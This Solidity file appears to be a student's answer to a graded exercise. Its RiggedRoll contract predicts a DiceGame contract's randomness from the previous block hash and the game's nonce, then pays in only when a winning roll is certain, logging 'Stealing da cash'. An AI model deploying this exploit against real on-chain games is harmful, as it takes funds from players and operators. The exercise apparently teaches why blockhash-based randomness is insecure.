pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.

    // Include the `receive()` function to enable the contract to receive incoming Ether.

    function riggedRoll() public{
        bytes32 prevHash = blockhash(block.number - 1);
        uint256 nonce = diceGame.nonce();
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;

        if(roll <= 5){
            uint minimumBuyIn = .003 ether;
            diceGame.rollTheDice{value: minimumBuyIn}();

            console.log("Stealing da cash");
        }
        else{
            console.log("Not the time");
        }
    }

    receive() external payable{

    }
}
